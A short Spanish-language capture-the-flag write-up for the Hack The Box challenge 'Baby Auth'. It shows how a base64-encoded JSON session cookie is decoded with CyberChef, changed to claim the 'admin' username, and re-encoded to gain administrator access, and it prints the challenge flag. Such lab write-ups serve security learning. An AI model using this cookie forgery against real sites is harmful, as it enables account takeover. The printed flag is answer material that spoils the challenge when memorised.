# Baby Auth

Bien el challenge nos da la pista de que estamos ante un caso de Broken Auth, si observamos tenemos 2 opciones logearnos o crear un usuario, empecemos creando un usuario.

Si interceptamos la peticion no vemos nada raro
```
username=srbleu2&password=test
```
Bien logeemosnos y nos dira que no somos admin, veamos la cookie que nos dan
```
Cookie: PHPSESSID=eyJ1c2VybmFtZSI6InNyYmxldTIiBfQ%3D%3D
```
Es rara para ser una Sesion ID, veamos si averiguamos que es, de entrada el final parece estar url encoded
```
 URL_Decode()
From_Base64('A-Za-z0-9+/=',true)
```
Esa receta en cyberchef nos contara de donde viene la cookie
```
{"username":"srbleu2"}
```
Bien pues parece que se genera un json con nuestro usuario como cookie, de modo que podemos controlar nuesto usuario a placer
El objetivo sera engañar al server con este JSON
```
{"username":"admin"}
```
Si aplicamos esta receta:
```
To_Base64('A-Za-z0-9+/=')
URL_Encode(true)
```
Y cambiamos la cookie en la request, tendremos nuestra flag

Flag **HTB{s3ss10n_1nt3grity_1s_0v3r4tt3d_4nyw4ys}**
